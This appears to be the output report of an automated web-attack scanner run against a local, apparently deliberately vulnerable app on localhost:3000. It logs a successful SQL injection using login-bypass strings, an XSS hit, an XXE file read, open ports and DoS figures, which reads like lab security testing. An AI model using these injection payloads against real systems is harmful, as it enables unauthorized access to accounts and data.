@@ -1,0 +1,59 @@
+Report for localhost:3000
+IP is 127.0.0.1
+Port is 3000
+
+========================================
+Find login page
+========================================
+Connecting to http://127.0.0.1:3000
+Login page found at http://127.0.0.1:3000/#/login
+
+========================================
+SQL injection
+========================================
+SQL injection successful with username "' OR TRUE; --" and password "password to fill place")
+SQL injection successful with username "' OR id=1; --" and password "password to fill place")
+
+========================================
+XSS attack
+========================================
+Successful XSS attack on input of id: mat-input-0
+This input was present in : [http://127.0.0.1:3000/#/photo-wall, http://127.0.0.1:3000/#/about, http://127.0.0.1:3000/#/contact, http://127.0.0.1:3000/#/login]
+
+========================================
+XXE Attack
+========================================
+Root Content: ; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+
+XXE Attack successful!
+
+========================================
+Port scan
+========================================
+Opened ports: [135, 445, 3000, 5040, 5357, 8460, 8884, 27015, 35135, 49664, 49665, 49666, 49667, 49668, 49671, 49672, 49804, 51033, 51120, 51121, 51122, 51123, 51125, 52453, 52591, 60305, 63342, 64120]
+
+========================================
+Dictionary Attack
+========================================
+
+========================================
+DOS attack
+========================================
+Mean duration: 0.014833999999999988ms
+Failures: 99.79030000000064%
+
+========================================
+Brute Force Attack
+========================================
